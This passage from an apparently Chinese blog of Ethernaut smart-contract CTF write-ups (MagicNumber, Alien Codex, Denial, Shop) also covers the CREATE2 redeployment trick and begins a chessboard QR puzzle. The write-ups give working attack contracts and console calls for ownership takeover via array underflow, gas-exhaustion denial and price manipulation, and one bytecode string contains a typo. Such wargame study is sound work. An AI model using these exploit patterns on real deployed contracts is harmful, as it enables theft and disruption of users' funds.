&#125;<br><br>    /*<br>    ____________/\\\_______/\\\\\\\\\_____        <br>     __________/\\\\\_____/\\\///////\\\___       <br>      ________/\\\/\\\____\///______\//\\\__      <br>       ______/\\\/\/\\\______________/\\\/___     <br>        ____/\\\/__\/\\\___________/\\\//_____    <br>         __/\\\\\\\\\\\\\\\\_____/\\\//________   <br>          _\///////////\\\//____/\\\/___________  <br>           ___________\/\\\_____/\\\\\\\\\\\\\\\_ <br>            ___________\///_____\///////////////__<br>    */<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">题目的意思就是部署一个合约 Solver ，要求在被调用 <span class="hljs-built_in">whatIsTheMeaningOfLife</span>() 函数时返回 <span class="hljs-number">42</span> 就可以了，但有一个限制是不能超过 <span class="hljs-number">10</span> 个 opcode<br></code></pre></td></tr></table></figure><h4 id="合约创建"><a href="#合约创建" class="headerlink" title="合约创建"></a>合约创建</h4><p><a href="https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2">Ethernaut Lvl 19 MagicNumber Walkthrough: How to deploy contracts using raw assembly opcodes | by Nicole Zhu | Coinmonks | Medium</a></p><ol><li><p>首先，用户或合约想以太坊发送交易。包括数据但没有接受人的地址（没有 <code>to</code> 地址）。此格式向 EVM 指示是 ，而不是常规发送&#x2F;调用事务。<code>contract creation</code></p></li><li><p>然后,EVM将solidity中的代码翻译为字节码，可直接转为操作码，在单个调用栈堆中执行。需要注意的重要一点：字节码包含 1） 和 2） 合约的实际值，按顺序连接。<code>contract creation</code>：<code>initialization code``runtime code</code></p></li><li><p>在congtract creation期间，EVM仅仅执行initialzation code，知道到达栈堆中第一条stop或start令，在此期间，合约的contructor会执行，合约就有地址了。在运行 <code>initialization code</code> 后，只有 <code>runtime code</code> 在堆栈上，然后将这些 <strong>opcode</strong> <strong>拷贝</strong> 到 <code>memory</code> 并返回到 <code>EVM</code></p></li><li><p>最后，EVM将runtime code返回的opcode存储在state storage，并于新地址相关联，合约被调用时，这些runtime code将会执行。</p></li></ol><h4 id="Analyse-4"><a href="#Analyse-4" class="headerlink" title="Analyse"></a>Analyse</h4><ul><li><p>所以为了解决该题，我们需要</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">initialization</span> opcodes<br></code></pre></td></tr></table></figure><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">runtime codes</span><br></code></pre></td></tr></table></figure><ul><li><code>initialization opcodes</code>: 由 <code>EVM</code> 运行创建合约并存储将来要用的 <code>runtime codes</code></li><li><code>runtime codes</code>: 包含所需的实际执行逻辑。对于本题来说，这是应该返回的代码的主要部分，应该 <strong>return 42</strong> 并且 <strong>under 10 opcodes</strong></li></ul></li></ul><h5 id="runtime-codes"><a href="#runtime-codes" class="headerlink" title="runtime codes :"></a>runtime codes :</h5><p>返回值由 return(p,s)，在此之前，使用mstore（p，v）储存在内存中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">0x602a     ;PUSH1 0x2a                  v<br>0x6080     ;PUSH1 0x80                  p<br>0x52       ;MSTORE  #将0x2a移动到0x80<br><br>首先，使用 mstore(p, v) 将 42 存储在内存中，其中 p 是在内存中的存储位置， v 是十六进制值，42 的十六进制是 0x2a<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">0x6020     ;PUSH1 0x20                  s<br>0x6080     ;PUSH1 0x80                  p<br>0xf3       ;RETURN<br><br>使用 return(p, s) 返回 0x2a ，其中 p 是值 0x2a 存储的位置，s 是值 0x2a 存储所占的大小 0x20 ，占32字节<br></code></pre></td></tr></table></figure><p>runtime codes ：302a60805260206080f3 正好10 opcodes</p><h5 id="initialization-codes"><a href="#initialization-codes" class="headerlink" title="initialization codes"></a>initialization codes</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">;copy bytecode to memory<br>0x600a     ;PUSH1 0x0a                      S(runtime code size)<br>0x60??     ;PUSH1 0x??                      F(current position of runtime opcodes)<br>0x6000     ;PUSH1 0x00                      T(destination memory index 0)<br>0x39       ;CODECOPY<br>首先，initialization codes 需要先将 runtime codes 拷贝到内存，然后再将其返回到 EVM 。将代码从一个地方复制到另一个地方是 codecopy(t, f, s) 操作码。t 是代码的目标位置，f 是 runtime codes 的当前位置，s 是代码的大小，以字节为单位，对于 602a60805260206080f3 就是 10 bytes<br><br><br>第一步PUSH1 0x0a对应的是length变量，因为我们上面构造的opcode序列长度为10。第二步PUSH1 0x0c是因为，初始化代码的长度为0xB，也就是运行时代码的字节码是从0xc偏移开始的，因此offset为0xc。第三步PUSH1 0是指定将我们的代码复制到memory的slot 0处。前4条指令，完成了将0xC到0x16这10个字节复制到memory的0x00到0xA位置处的任务（，60 0c指令确实起到了指定源代码起始偏移量的作用。正如您所指出的，前面的6个字节（60 0a 60 0c 60 00 39）是用来配置这次复制操作的指令，分别指定了复制的长度、源代码的起始偏移以及目标内存的起始位置。因此，从第7个字节（偏移量0x0c）开始的数据才是实际需要被复制的代码内容。）<br><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">;return code from memory to EVM<br>0x600a     ;PUSH1 0x0a                      S<br>0x6000     ;PUSH1 0x00                      P<br>0xf3       ;RETURN<br>需要将内存中的 runtime codes 返回到 EVM<br></code></pre></td></tr></table></figure><ul><li><code>initialization codes</code> 总共占了 <strong>0x0c</strong> 字节，这表示 <code>runtime codes</code> 从索引 <strong>0x0c</strong> 开始，所以 <strong>??</strong> 的地方是 <strong>0x0c</strong></li><li>所以，<code>initialization codes</code> 最后的顺序是 <strong>600a600c600039600a6000f3</strong></li></ul><p>initialization codes：600a600c600039600a6000f3</p><h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>opcodes  ：<strong>0x600a600c600039600a6000f3602a60805260206080f3</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity"><br>var bytecode = &quot;0x600a600c600039600a6000f3602a60805260206080f3&quot;;<br>web3.eth.sendTransaction(&#123; from: player, data: bytecode &#125;, function(err,res)&#123;console.log(res)&#125;);<br>#查看交易记录 得到 to：0x820e93bfa60c20a9166e0955fd842d09f268b1ca<br>await contract.setSolver(&#x27;0x820e93bfa60c20a9166e0955fd842d09f268b1ca&#x27;);<br></code></pre></td></tr></table></figure><h3 id="Alien-Codex"><a href="#Alien-Codex" class="headerlink" title="Alien Codex"></a>Alien Codex</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.5.0;<br><br>import &quot;../helpers/Ownable-05.sol&quot;;<br><br>contract AlienCodex is Ownable &#123;<br>    bool public contact;<br>    bytes32[] public codex;<br><br>    modifier contacted() &#123;<br>        assert(contact);<br>        _;<br>    &#125;<br><br>    function makeContact() public &#123;<br>        contact = true;<br>    &#125;<br><br>    function record(bytes32 _content) public contacted &#123;<br>        codex.push(_content);<br>    &#125;<br><br>    function retract() public contacted &#123;<br>        codex.length--;<br>    &#125;<br><br>    function revise(uint256 i, bytes32 _content) public contacted &#123;<br>        codex[i] = _content;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><!-- You've uncovered an Alien contract. Claim ownership to complete the level.  Things that might helpUnderstanding how array storage worksUnderstanding ABI specificationsUsing a very underhanded approach --><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br><br>pragma solidity ^0.6.0;<br><br>import &quot;../GSN/Context.sol&quot;;<br>/**<br> * @dev Contract module which provides a basic access control mechanism, where<br> * there is an account (an owner) that can be granted exclusive access to<br> * specific functions.<br> *<br> * By default, the owner account will be the one that deploys the contract. This<br> * can later be changed with &#123;transferOwnership&#125;.<br> *<br> * This module is used through inheritance. It will make available the modifier<br> * `onlyOwner`, which can be applied to your functions to restrict their use to<br> * the owner.<br> */<br>contract Ownable is Context &#123;<br>    address private _owner;<br><br>    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);<br><br>    /**<br>     * @dev Initializes the contract setting the deployer as the initial owner.<br>     */<br>    constructor () internal &#123;<br>        address msgSender = _msgSender();<br>        _owner = msgSender;<br>        emit OwnershipTransferred(address(0), msgSender);<br>    &#125;<br><br>    /**<br>     * @dev Returns the address of the current owner.<br>     */<br>    function owner() public view returns (address) &#123;<br>        return _owner;<br>    &#125;<br><br>    /**<br>     * @dev Throws if called by any account other than the owner.<br>     */<br>    modifier onlyOwner() &#123;<br>        require(_owner == _msgSender(), &quot;Ownable: caller is not the owner&quot;);<br>        _;<br>    &#125;<br><br>    /**<br>     * @dev Leaves the contract without owner. It will not be possible to call<br>     * `onlyOwner` functions anymore. Can only be called by the current owner.<br>     *<br>     * NOTE: Renouncing ownership will leave the contract without an owner,<br>     * thereby removing any functionality that is only available to the owner.<br>     */<br>    function renounceOwnership() public virtual onlyOwner &#123;<br>        emit OwnershipTransferred(_owner, address(0));<br>        _owner = address(0);<br>    &#125;<br><br>    /**<br>     * @dev Transfers ownership of the contract to a new account (`newOwner`).<br>     * Can only be called by the current owner.<br>     */<br>    function transferOwnership(address newOwner) public virtual onlyOwner &#123;<br>        require(newOwner != address(0), &quot;Ownable: new owner is the zero address&quot;);<br>        emit OwnershipTransferred(_owner, newOwner);<br>        _owner = newOwner;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Analyse-5"><a href="#Analyse-5" class="headerlink" title="Analyse"></a>Analyse</h4><p>要求获得owner的权限，合约继承自Owenable合约，其中有 _owenr状态变量，则可以推出存储布局</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">-------------------------------</span><br><span class="hljs-code">|   contact(1)| _owner(20)    | &lt;- slot 0</span><br><span class="hljs-code">-------------------------------</span><br><span class="hljs-section">|       codex.length(32)      | &lt;- slot 1</span><br><span class="hljs-section">-------------------------------</span><br>|          codex[0]           | &lt;- slot keccak256(1)<br><span class="hljs-code">-------------------------------</span><br><span class="hljs-code">|           ...               | &lt;- slot ...</span><br><span class="hljs-code">-------------------------------</span><br>| codex[2^256-1-keccak256(1)] | &lt;- slot max<br>-------------------------------<br></code></pre></td></tr></table></figure><p>可以看出codex长度没有设置，可以通过retract函数可以使数组长度溢出，然后可以通过revise方法进行数组赋值。所以，本题可以codex数组溢出到slot0来修改owner的存储。<br>x&#x3D;keccak256(bytes32(1))) ，那么当我们修改 codex[y],(y&#x3D;2^256-x+0) 时就能修改 slot 0 ，从而修改 owner。<br>但是由于函数修改器的存在，我们需要使用makeContact()函数来解除限制。</p><h4 id="Attack-2"><a href="#Attack-2" class="headerlink" title="Attack"></a>Attack</h4><p>第一步我们先解除限制</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">makeContact</span>()<br></code></pre></td></tr></table></figure><p>然后使用retract实现数组溢出</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">retract</span>()<br></code></pre></td></tr></table></figure><p>由于数组长度没有定义，所以为0，只要调用retract()函数，就会溢出，然后调用revise()函数修改数组长度，从而修改owner。<br>然后只需修改codex[2^256 - keccak256(1)]的值就可以改变owner。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.24;<br><br>contract codex &#123;<br><br>    function cal() view returns(bytes32)&#123;<br>        return keccak256((bytes32(1)));<br>    &#125;<br>    //0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6<br>&#125;<br></code></pre></td></tr></table></figure><p>y &#x3D; 2^256 - keccak256(1)&#x3D;0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a<br>然后调用revise函数，第二个参数必须补全32位。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">revise</span>(<br>    <span class="hljs-string">&quot;0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a&quot;</span>,<br>    <span class="hljs-string">&quot;0x000000000000000000000000D15e151C53bfbDcaf21f5FC849167c526c5A4572&quot;</span>)<br></code></pre></td></tr></table></figure><p>然后就可以通关了。</p><h3 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Denial &#123;<br>    address public partner; // withdrawal partner - pay the gas, split the withdraw<br>    address public constant owner = address(0xA9E);<br>    uint256 timeLastWithdrawn;<br>    mapping(address =&gt; uint256) withdrawPartnerBalances; // keep track of partners balances<br><br>    function setWithdrawPartner(address _partner) public &#123;<br>        partner = _partner;<br>    &#125;<br><br>    // withdraw 1% to recipient and 1% to owner<br>    function withdraw() public &#123;<br>        uint256 amountToSend = address(this).balance / 100;<br>        // perform a call without checking return<br>        // The recipient can revert, the owner will still get their share<br>        partner.call&#123;value: amountToSend&#125;(&quot;&quot;);<br>        payable(owner).transfer(amountToSend);<br>        // keep track of last withdrawal time<br>        timeLastWithdrawn = block.timestamp;<br>        withdrawPartnerBalances[partner] += amountToSend;<br>    &#125;<br><br>    // allow deposit of funds<br>    receive() external payable &#123;&#125;<br><br>    // convenience function<br>    function contractBalance() public view returns (uint256) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是一个简单的钱包，会随着时间的推移而流失资金。您可以成为提款伙伴，慢慢提款。<br>通关条件： 在owner调用withdraw()时拒绝提取资金（合约仍有资金，并且交易的gas少于1M<br>要求阻止提取资金。</p><p>transfer与send相似，都为转账操作<br>transfer出错抛出异常<br>send、call出错不抛出异常，返回true或false<br>tansfer相对send更安全<br>send、call即便转账失败也会执行其后的代码<br>慎用call函数转账，容易发生重入攻击。</p><h4 id="Analyse-6"><a href="#Analyse-6" class="headerlink" title="Analyse"></a>Analyse</h4><p>本题会通过call以及transfer函数来进行转账。每当用户提款时，会调用withdraw函数，取出1%发给partner，还有1%发给owner.<br>本题代码漏洞在于call函数没有检查返回值和指定gas。所以如果在调用call函数时消耗了所有的gas，那么call函数就会 触发 out of gas错误，而之后的transfer函数也会因为gas不足而导致失败。<br>这里有两种思路，一种是通过循环不断消耗gas，另外一种是通过assert来做条件检查</p><p>assert 抛出panic错误时会终止执行。</p><h4 id="Attack-3"><a href="#Attack-3" class="headerlink" title="Attack"></a>Attack</h4><h5 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br>contract Attack &#123;<br>    address public target;<br>    constructor(address payable _addr)public payable&#123;<br>        target=_addr;<br>        target.call(abi.encodeWithSignature(&quot;setWithdrawPartner(address)&quot;, address(this)));<br>    &#125;<br><br>    fallback() payable external &#123;<br>        while(true)&#123;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br>contract DenialAttack &#123;<br>    fallback() external payable &#123;<br>        assert(false);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后执行await contract.setWithdrawPartner(“0x03e1a1cf7fc319822355dce72c50b368094546ef”)</p><h3 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>interface Buyer &#123;<br>    function price() external view returns (uint256);<br>&#125;<br><br>contract Shop &#123;<br>    uint256 public price = 100;<br>    bool public isSold;<br><br>    function buy() public &#123;<br>        Buyer _buyer = Buyer(msg.sender);<br><br>        if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;<br>            isSold = true;<br>            price = _buyer.price();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Сan you get the item from the shop for less than the price asked?</p><p>Things that might help:<br>Shop expects to be used from a Buyer<br>Understanding restrictions of view functions<br>要求少于规定的price。提供price查询方法，当购买时查询一下buyer.price。购买成功后记录buyer.price。也就是我们只要在成功购买后给一个更低的price即可。<br>本题是一个购买合约，要求购买时价格小于规定的价格。  </p><h4 id="Analyse-7"><a href="#Analyse-7" class="headerlink" title="Analyse"></a>Analyse</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;<br>    isSold = true;<br>    price = _buyer.price();<br>&#125;<br></code></pre></td></tr></table></figure><p>发现第一次使用buy函数时时false，但是当第二次使用该函数的时候，isSold为true，就在这里修改price即可。</p><h4 id="Attack-4"><a href="#Attack-4" class="headerlink" title="Attack"></a>Attack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>interface IShop&#123;<br>    function buy() external;<br>    function isSold() external view returns(bool);<br>&#125;<br><br>contract Attack&#123;<br>    IShop  public shop;<br>    constructor(address _target)&#123;<br>        shop = IShop(_target);<br>    &#125;<br>    function price() external view  returns(uint256)&#123;<br>        return shop.isSold() ?0 :100 ;<br>    &#125;<br>    <br>    function buyAttack() external &#123;<br>        shop.buy();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据isSold（）函数修改price（）函数的返回值</p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CREATE2</title>
      <link href="/2023/11/21/CREATE2/"/>
      <url>/2023/11/21/CREATE2/</url>
      
        <content type="html"><![CDATA[<p><code>EATE2</code> 是以太坊在 “君士坦丁堡” 这次硬分叉升级中引入的一个新操作码，不同于 <code>CREATE</code>，它使用新的方式来计算合约地址，让生成的合约地址更具有可控性。通过 <code>CREATE2</code> 可以延伸出很多有意思的玩法，在 CTF 中最常见的就是利用这种可控性，在同一个地址先后部署字节码完全不同的合约。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="CREATE"><a href="#CREATE" class="headerlink" title="CREATE"></a>CREATE</h3><p>如果利用外部账户或者使用 <code>CREATE</code> 操作码的合约账户创建一个合约，那么很容易就能确定被创建合约的地址。每个账户都有一个与之关联的 <code>nonce</code>：对外部账户而言，每发送一个交易，<code>nonce</code> 就会随之 <code>+1</code>；对合约账户而言，每创建一个合约，<code>nonce</code> 就会随之 <code>+1</code>。新合约的地址由创建合约交易的发送者账户地址及其 <code>nonce</code> 值计算得到，其具体公式如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">keccak256</span><span class="hljs-params">(rlp.encode(address, nonce)</span></span>)<span class="hljs-selector-attr">[12:]</span><br></code></pre></td></tr></table></figure><h3 id="CREATE2"><a href="#CREATE2" class="headerlink" title="CREATE2"></a>CREATE2</h3><p>不同于原来的 <code>CREATE</code> 操作码，在合约地址的计算方法上，<code>CREATE2</code> 不再依赖于账户的 <code>nonce</code>，而是对以下参数进行哈希计算，得出新的地址：</p><ul><li>合约创建者的地址（<code>address</code>)</li><li>作为参数的混淆值（<code>salt</code>）</li><li>合约创建代码 (<code>init_code</code>)</li></ul><p>具体的计算公式如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">keccak256</span><span class="hljs-params">(<span class="hljs-number">0</span>xff ++ address ++ salt ++ keccak256(init_code)</span></span>)<span class="hljs-selector-attr">[12:]</span><br></code></pre></td></tr></table></figure><p>一个需要注意的重要细节是，计算合约地址所需的最后一个参数并非合约代码，而是其创建代码。该代码是用来创建合约的，合约创建完成后将返回运行时字节码。</p><p>这意味着，如果我们控制了合约的创建代码并使其保持不变，然后控制合约构造函数返回的运行时字节码，那么我们很容易就能做到在同一个地址上，反复部署完全不同的合约。事实上 <code>CREATE2</code> 这种让合约在部署后可以被重新更改的特性存在着潜在的安全问题，也引起了人们对其的<a href="https://ethereum-magicians.org/t/potential-security-implications-of-create2-eip-1014/2614">讨论</a>。</p><p>在 CTF 中，这种特性往往会被用来作为一个技巧，通过在同一个地址上部署不同的合约用来 bypass 不同的校验。</p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>题目</title>
      <link href="/2023/11/20/%E9%A2%98%E7%9B%AE/"/>
      <url>/2023/11/20/%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h3 id="强网拟态2023"><a href="#强网拟态2023" class="headerlink" title="强网拟态2023"></a>强网拟态2023</h3><h4 id="国际象棋与二维码"><a href="#国际象棋与二维码" class="headerlink" title="国际象棋与二维码"></a>国际象棋与二维码</h4><p><img src="/../images/attach-17004807344472.png" alt="attach"></p><p>查看像素以及方格的个数。然后根据给出的题目为国际象棋棋盘。先生成一个500*500像素，行列为49的国际象棋棋盘</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>size=<span class="hljs-number">49</span><br>grid_size=<span class="hljs-number">10</span><br>img=Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>,(size*grid_size,size*grid_size),color= <span class="hljs-string">&#x27;white&#x27;</span>)<br><br>imag_arr= np.array(img)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,size,<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, size,<span class="hljs-number">2</span>):<br>        imag_arr[i*grid_size:(i+<span class="hljs-number">1</span>)*grid_size, j*grid_size:(j+<span class="hljs-number">1</span>)*grid_size] = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>] <br>        imag_arr[(i+<span class="hljs-number">1</span>)*grid_size:(i+<span class="hljs-number">2</span>)*grid_size, (j+<span class="hljs-number">1</span>)*grid_size:(j+<span class="hljs-number">2</span>)*grid_size] = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br><br><br>final_img = Image.fromarray(imag_arr)<br>final_img.save(<span 